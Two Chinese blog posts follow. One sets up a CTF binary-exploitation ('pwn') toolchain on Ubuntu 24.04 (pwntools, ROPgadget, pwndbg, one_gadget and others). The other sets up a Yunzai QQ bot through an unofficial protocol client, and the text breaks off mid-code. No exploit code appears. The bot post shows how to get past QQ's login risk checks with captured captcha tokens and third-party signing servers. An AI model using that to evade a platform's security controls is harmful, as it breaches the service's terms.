<h3 id="0-安装24-04Ubuntu"><a href="#0-安装24-04Ubuntu" class="headerlink" title="0.安装24.04Ubuntu"></a>0.安装24.04Ubuntu</h3><p>这里我选择wsl的安装，直接安装完成后，打开会自动进行进一步的安装以及初始化。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/01/24/%E5%BF%AB%E9%80%9F%E5%9C%A824-04Ubuntu%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20241209111313097.png"
                      class=""
                >

<h3 id="1-更新系统"><a href="#1-更新系统" class="headerlink" title="1. 更新系统"></a>1. 更新系统</h3><p>首先，确保你的系统是最新的：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update &amp;&amp; <span class="built_in">sudo</span> apt upgrade -y</span><br></pre></td></tr></table></figure></div>

<h3 id="2-安装基本工具"><a href="#2-安装基本工具" class="headerlink" title="2. 安装基本工具"></a>2. 安装基本工具</h3><p>安装一些常用的开发工具和库：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install -y build-essential gdb python3 python3-pip git</span><br></pre></td></tr></table></figure></div>

<h3 id="3-安装-pwntools"><a href="#3-安装-pwntools" class="headerlink" title="3. 安装 pwntools"></a>3. 安装 pwntools</h3><p><code>pwntools</code> 是 PWN 环境中常用的 Python 库，用于编写漏洞利用脚本：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pip3 install pwntools</span><br></pre></td></tr></table></figure></div>

<p>可能会有报错如下：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/01/24/%E5%BF%AB%E9%80%9F%E5%9C%A824-04Ubuntu%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20241209111731629.png"
                      class=""
                >

<p>由于 Ubuntu 24.04 使用了<code>externally-managed-environment</code>模式，这种模式下系统不允许直接用 <code>pip</code> 安装全局包。为了避免对系统 Python 环境造成破坏，所以要创建一个虚拟环境来安装 Python 包。</p>
<p><strong>解决方法：使用虚拟环境</strong></p>
<ol>
<li><p>**安装 <code>python3-venv</code> 和 <code>python3-pip</code>**： 首先，确保你已经安装了 <code>python3-venv</code> 和 <code>python3-pip</code>，这些工具允许你创建虚拟环境并安装 pip 包。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install python3-venv python3-pip</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>创建虚拟环境</strong>： 创建一个新的虚拟环境，用来安装和管理 <code>pwntools</code>。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -m venv pwnenv</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>激活虚拟环境</strong>： 激活虚拟环境，这样你就可以在隔离的环境中安装 Python 包了。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> pwnenv/bin/activate</span><br></pre></td></tr></table></figure></div>

<p>激活后，你会看到命令提示符前面会加上 <code>(pwnenv)</code>，表示你已经进入虚拟环境。</p>
</li>
<li><p>**安装 <code>pwntools</code>**： 在虚拟环境中，你可以使用 <code>pip</code> 安装 <code>pwntools</code> 和其他需要的 Python 包。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pip install pwntools</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>退出虚拟环境</strong>： 使用完虚拟环境后，可以通过以下命令退出：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">deactivate</span><br></pre></td></tr></table></figure></div></li>
</ol>
<p><strong>使用 <code>pipx</code>（可选）</strong></p>
<p>如果不想每次都手动激活虚拟环境，可以考虑使用 <code>pipx</code> 来管理独立的 Python 应用程序。<code>pipx</code> 会自动为我们创建虚拟环境并管理依赖。</p>
<ol>
<li><p>**安装 <code>pipx</code>**：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install pipx</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>**使用 <code>pipx</code> 安装 <code>pwntools</code>**：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pipx install pwntools</span><br></pre></td></tr></table></figure></div></li>
</ol>
<p><code>pipx</code> 会自动为你创建一个虚拟环境，并在其中安装 <code>pwntools</code>，你可以直接运行它，而无需手动管理虚拟环境。</p>
<p>但这个pipx亲测太慢了！！！不推荐。</p>
<h3 id="4-安装-ROPgadget"><a href="#4-安装-ROPgadget" class="headerlink" title="4. 安装 ROPgadget"></a>4. 安装 ROPgadget</h3><p><code>ROPgadget</code> 是一个用于查找 ROP 链 gadget 的工具：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pip3 install ropgadget</span><br></pre></td></tr></table></figure></div>

<h3 id="5-安装-seccomp-tools"><a href="#5-安装-seccomp-tools" class="headerlink" title="5. 安装 seccomp-tools"></a>5. 安装 seccomp-tools</h3><p><code>seccomp-tools</code> 用于分析和利用 seccomp 过滤器：</p>
<p>安装 Ruby 和 RubyGems</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install -y ruby-full</span><br></pre></td></tr></table></figure></div>

<p>使用 RubyGems 安装 <code>seccomp-tools</code></p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> gem install seccomp-tools</span><br></pre></td></tr></table></figure></div>

<p>安装完成后，可以通过以下命令验证安装是否成功：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">seccomp-tools --version</span><br></pre></td></tr></table></figure></div>

<h3 id="6-安装-glibc-all-in-one"><a href="#6-安装-glibc-all-in-one" class="headerlink" title="6. 安装 glibc-all-in-one"></a>6. 安装 glibc-all-in-one</h3><p><code>glibc-all-in-one</code> 包含了不同版本的 glibc，方便进行漏洞测试：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> git <span class="built_in">clone</span> https://github.com/matrix1001/glibc-all-in-one.git</span><br><span class="line"><span class="built_in">cd</span> glibc-all-in-one/</span><br><span class="line"><span class="built_in">sudo</span> python3 update_list</span><br></pre></td></tr></table></figure></div>

<h3 id="7-安装patchelf"><a href="#7-安装patchelf" class="headerlink" title="7. 安装patchelf"></a>7. 安装patchelf</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/NixOS/patchelf.git</span><br><span class="line"><span class="built_in">cd</span> patchelf</span><br><span class="line">./bootstrap.sh </span><br></pre></td></tr></table></figure></div>

<p>若显示报错</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/01/24/%E5%BF%AB%E9%80%9F%E5%9C%A824-04Ubuntu%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20241209231226259.png"
                      class=""
                >

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install autoconf automake libtool</span><br><span class="line">./bootstrap.sh</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make check</span><br><span class="line"><span class="built_in">sudo</span> make install</span><br></pre></td></tr></table></figure></div>



<h3 id="8-安装-pwndbg"><a href="#8-安装-pwndbg" class="headerlink" title="8. 安装 pwndbg"></a>8. 安装 pwndbg</h3><p><code>pwndbg</code> 是一个为 GDB 提供增强功能的插件，它对调试 PWN 题目非常有用：</p>
<p>装的时候记得先切到之前建立的虚拟环境。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg</span><br><span class="line"><span class="built_in">cd</span> pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure></div>

<p>若产生如下错误，则有可能是网络连接的问题（具体的可以看日志文件）。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/01/24/%E5%BF%AB%E9%80%9F%E5%9C%A824-04Ubuntu%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20241209233456670.png"
                      class=""
                >

<p>可以配置镜像源加速</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p ~/.pip</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[global]</span></span><br><span class="line"><span class="string">index-url = https://pypi.tuna.tsinghua.edu.cn/simple&quot;</span> &gt; ~/.pip/pip.conf</span><br></pre></td></tr></table></figure></div>



<h3 id="8-安装-one-gadget"><a href="#8-安装-one-gadget" class="headerlink" title="8. 安装 one_gadget"></a>8. 安装 one_gadget</h3><p><code>one_gadget</code> 是一个用来快速查找 libc 中单次调用的 RCE gadget 的工具：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">gem install one_gadget</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>env</tag>
      </tags>
  </entry>
  <entry>
    <title>云崽bot基础搭建过程记录</title>
    <url>/blog/2024/11/27/%E4%BA%91%E5%B4%BDbot%E5%9F%BA%E7%A1%80%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h2 id="云崽bot基础搭建过程记录"><a href="#云崽bot基础搭建过程记录" class="headerlink" title="云崽bot基础搭建过程记录"></a>云崽bot基础搭建过程记录</h2><p>突发奇想想要搭建一个qqbot玩玩，经同学推荐，准备从最简单的yunzai框架入手。</p>
<h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><blockquote>
<p>环境准备：Windows&#x2F;Linux&#x2F;MacOS&#x2F;Android<br><a class="link"   href="https://nodejs.org/" >Node.js(&gt;&#x3D;v21)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>, <a class="link"   href="https://redis.io/" >Redis<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>, <a class="link"   href="https://git-scm.com/" >Git<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</blockquote>
<h5 id="redis安装"><a href="#redis安装" class="headerlink" title="redis安装"></a>redis安装</h5><ul>
<li><p>下载地址<a class="link"   href="https://gitee.com/link?target=https://wwrl.lanzouw.com/iml4v0xwo0za" >redis<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>,密码:114514</p>
</li>
<li><p>解压后启动redis-server.exe这个文件。</p>
</li>
<li><p>将redis-server.exe所在的目录添加进环境变量，这样yunzai启动时会自动找到redis并启动</p>
</li>
</ul>
<h5 id="nodejs安装"><a href="#nodejs安装" class="headerlink" title="nodejs安装"></a>nodejs安装</h5><p><a class="link"   href="https://nodejs.cn/download/" >nodejs中文网<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<ul>
<li>windows操作系统的话直接下64位msi文件一键安装就行了</li>
<li>linux的话下下来是一个<code>.tar.xz</code>文件，<code>tar -xvf xxx.tar.xz</code>就能够解压出来，然后把<code>./bin/</code>目录放到环境变量里去就行，<code>export PATH=/path/to/node-v20.18.0-linux-x64/bin:$PATH</code>，不想每次都重新设置环境变量就直接在<code>~/.bashrc</code>中加这一行命令</li>
</ul>
<h5 id="git安装"><a href="#git安装" class="headerlink" title="git安装"></a>git安装</h5><ul>
<li>windows：<a class="link"   href="https://git-scm.com/downloads/win" >https://git-scm.com/downloads/win<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
<li>linux：<code>sudo apt update | sudo apt install git</code></li>
</ul>
<h5 id="yunzai本体安装"><a href="#yunzai本体安装" class="headerlink" title="yunzai本体安装"></a>yunzai本体安装</h5><p>有了如上几个必选项后</p>
<div class="highlight-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line">git clone --depth <span class="number">1</span> https://gitee.com/TimeRainStarSky/Yunzai</span><br><span class="line"><span class="built_in">cd</span> Yunzai</span><br></pre></td></tr></table></figure></div>



<h4 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h4><p>在yunzai目录下启动：</p>
<div class="highlight-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line">node .</span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/27/%E4%BA%91%E5%B4%BDbot%E5%9F%BA%E7%A1%80%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/image-20241124135258312.png"
                      class=""
                >

<h4 id="启动协议端"><a href="#启动协议端" class="headerlink" title="启动协议端"></a>启动协议端</h4><p>“协议端” 是指实现 QQ 通信协议的服务组件。不同的协议端提供了不同的功能和适配方式，例如：</p>
<ul>
<li><strong>OneBot v11</strong>：支持标准化的 OneBot 协议，可以与多种第三方服务交互。</li>
<li><strong>ComWeChat</strong>：通过仿 QQ 客户端的方式实现通信。</li>
<li><strong>GSUIDCore</strong> 和 <strong>OPQBot</strong>：各自提供不同的兼容特性和扩展。</li>
</ul>
<p>这些协议端负责处理与 QQ 的连接（包括登录、消息收发等），为机器人提供基础的通信能力。</p>
<p>启动协议端的目的是：</p>
<ul>
<li>连接到 QQ 服务器并登录指定的 QQ 账号。</li>
<li>监听来自 QQ 的消息（例如群聊消息、私聊消息等）。</li>
<li>转发消息到 Yunzai-Bot 的核心逻辑，进行处理。</li>
<li>将 Yunzai-Bot 处理后的响应结果（如回复消息）发送回 QQ。</li>
</ul>
<h4 id="账号绑定"><a href="#账号绑定" class="headerlink" title="账号绑定"></a>账号绑定</h4><h5 id="协议端绑定"><a href="#协议端绑定" class="headerlink" title="协议端绑定"></a>协议端绑定</h5><p>我们选用OneBotv11作为协议端，下载并运行<code>Lagrange.OneBot</code>后改配置，这里实际上是配置了一个反向 WebSocket 连接，而在<code>yunzai/config/config/bot.yaml</code>中实际有指定服务器开放的端口为2536，所以我们要在协议端开放2536端口。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/27/%E4%BA%91%E5%B4%BDbot%E5%9F%BA%E7%A1%80%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/image-20241125003714736.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/27/%E4%BA%91%E5%B4%BDbot%E5%9F%BA%E7%A1%80%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/image-20241125003412271.png"
                      class=""
                >



<p>修改过后大概长这样：</p>
<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Logging&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;LogLevel&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Default&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Information&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Microsoft&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Warning&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Microsoft.Hosting.Lifetime&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Information&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;SignServerUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span>	</span><br><span class="line">    <span class="attr">&quot;SignProxyUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;MusicSignServerUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Account&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;Uin&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Protocol&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Linux&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;AutoReconnect&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;GetOptimumServer&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Message&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;IgnoreSelf&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;StringPost&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;QrCode&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;ConsoleCompatibilityMode&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Implementations&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ReverseWebSocket&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Host&quot;</span><span class="punctuation">:</span> <span class="string">&quot;127.0.0.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Port&quot;</span><span class="punctuation">:</span> <span class="number">2536</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Suffix&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/OneBotv11&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;ReconnectInterval&quot;</span><span class="punctuation">:</span> <span class="number">5000</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;HeartBeatInterval&quot;</span><span class="punctuation">:</span> <span class="number">5000</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;AccessToken&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>



<p>其中<code>Lagrange.OneBot</code>在配置改完后按任意键继续时，会出现一个二维码。这时我们拿自己的qq小号(bot)扫码就可以登录进去了。之后我们在yunzai的主程序中就看到了连接建立</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/27/%E4%BA%91%E5%B4%BDbot%E5%9F%BA%E7%A1%80%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/image-20241125004337786.png"
                      class=""
                >

<p>但有时候登录时会显示需要Captcha认证，需要输入<code>ticket</code>和<code>token</code>，这时候我们需要到提供的网址处去手动验证，并抓包查看对应的<code>ticket</code>和<code>token</code>。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/27/%E4%BA%91%E5%B4%BDbot%E5%9F%BA%E7%A1%80%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/image-20241125142132940.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/27/%E4%BA%91%E5%B4%BDbot%E5%9F%BA%E7%A1%80%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/image-20241125142205096.png"
                      class=""
                >

<p>然后可以分别输入ticket和token。之后如果还是显示安全风险无法登录，可以在<code>appsettings.json</code>中加入<code>&quot;SignServerUrl&quot;: &quot;https://sign.lagrangecore.org/api/sign/25765&quot;</code>这么一条配置，用来获取签名。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/27/%E4%BA%91%E5%B4%BDbot%E5%9F%BA%E7%A1%80%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/image-20241125141307897.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/27/%E4%BA%91%E5%B4%BDbot%E5%9F%BA%E7%A1%80%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/image-20241125141648698.png"
                      class=""
                >

<p>如果还是显示安全风险，可以到<a class="link"   href="https://lagrangedev.github.io/LagrangeGo/guide/sign" >签名服务器文档<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>中找一个别的签名服务器换上。实在不行，可以把当前目录下除了<code>Lagrange.OneBot.exe</code>和<code>appsettings.json</code>全部删除了重新启动。</p>
<h5 id="设置主人"><a href="#设置主人" class="headerlink" title="设置主人"></a>设置主人</h5><p>之后我们发现<code>yunzai/plugins/example</code>中有个<code>主动复读.js</code>文件，里面实现的内容就是匹配到<code>#复读</code>就进行复读，可以用来进行测试。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/27/%E4%BA%91%E5%B4%BDbot%E5%9F%BA%E7%A1%80%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/image-20241125143521393.png"
                      class=""
                >

<p>然后就给bot私发#设置主人就能够获取权限。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/27/%E4%BA%91%E5%B4%BDbot%E5%9F%BA%E7%A1%80%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/image-20241125144021413.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/27/%E4%BA%91%E5%B4%BDbot%E5%9F%BA%E7%A1%80%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/image-20241125144452592.png"
                      class=""
                >

<p>当然也可以直接改<code>yunzai/config/config/other.yaml</code>中的masterQQ以及master进行配置。其中master的格式是</p>
<p><code>bot qq:master qq</code>。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/27/%E4%BA%91%E5%B4%BDbot%E5%9F%BA%E7%A1%80%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/image-20241125144941477.png"
                      class=""
                >



<h4 id="插件安装"><a href="#插件安装" class="headerlink" title="插件安装"></a>插件安装</h4><p><a class="link"   href="https://gitee.com/yhArcadia/Yunzai-Bot-plugins-index" >插件大全<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>插件里提供了各式不同类型的功能，在yunzai bot运行时，会自动加载<code>yunzai/plugins</code>目录下的各个插件目录。</p>
<p>新的插件可以自己进行编写，存在插件目录下，也可以github和gitee上找新插件下载，大体有以下几种方式进行安装。</p>
<h5 id="自带指令"><a href="#自带指令" class="headerlink" title="自带指令"></a>自带指令</h5><p>一般能装一些最常用的插件</p>
<div class="highlight-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line">#安装TRSS-Plugin</span><br></pre></td></tr></table></figure></div>

<h5 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h5><p>可以方便下载gitee上一些插件</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -o &quot;./plugins/example/定时群发.js&quot; &quot;https://gitee.com/batvbs/Miao-Yunzai-batvbs/raw/master/定时群发.js&quot;</span><br></pre></td></tr></table></figure></div>



<h4 id="基础功能测试及编写"><a href="#基础功能测试及编写" class="headerlink" title="基础功能测试及编写"></a>基础功能测试及编写</h4><p>以<code>./plugin/example</code>目录下的<code>主动复读.js</code>为例</p>
<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">example2</span> <span class="keyword">extends</span> <span class="title class_ inherited__">plugin</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>(&#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&quot;复读&quot;</span>,</span><br><span class="line">      <span class="attr">dsc</span>: <span class="string">&quot;复读用户发送的内容，然后撤回&quot;</span>,</span><br><span class="line">      <span class="comment">/** https://oicqjs.github.io/oicq/#events */</span></span><br><span class="line">      <span class="attr">event</span>: <span class="string">&quot;message&quot;</span>,</span><br><span class="line">      <span class="attr">priority</span>: <span class="number">5000</span>,</span><br><span class="line">      <span class="attr">rule</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/** 命令正则匹配 */</span></span><br><span class="line">          <span class="attr">reg</span>: <span class="string">&quot;^#复读$&quot;</span>,</span><br><span class="line">          <span class="comment">/** 执行方法 */</span></span><br><span class="line">          <span class="attr">fnc</span>: <span class="string">&quot;repeat&quot;</span>,</span><br><span class="line">          <span class="attr">permission</span>: <span class="string">&quot;master&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/** 复读 */</span></span><br><span class="line">  <span class="keyword">async</span> <span class="title function_">repeat</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">/** 设置上下文，后续接收到内容会执行doRep方法 */</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">setContext</span>(<span class="string">&quot;doRep&quot;</span>)</span><br><span class="line">    <span class="comment">/** 回复 */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">reply</span>(<span class="string">&quot;请发送要复读的内容&quot;</span>, <span class="literal">false</span>, &#123; <span class="attr">at</span>: <span class="literal">true</span> &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/** 接受内容 */</span></span><br><span class="line">  <span class="title function_">doRep</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">/** 结束上下文 */</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">finish</span>(<span class="string">&quot;doRep&quot;</span>)</span><br><span class="line">    <span class="comment">/** 复读内容 */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">reply</span>(<span class="variable language_">this</span>.<span class="property">e</span>.<span class="property">message</span>, <span class="literal">false</span>, &#123; <span class="attr">recallMsg</span>: <span class="number">5</span> &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>首先是继承了plugin父类。各个参数的含义见注释。</p>
<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">class</span> <span class="title class_">plugin</span> &#123;</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> name 插件名称</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> dsc 插件描述</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> handler handler配置</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> handler.key handler支持的事件key</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> handler.fn handler的处理func</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> namespace namespace，设置handler时建议设置</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> event 执行事件，默认message</span></span><br><span class="line"><span class="comment">   * 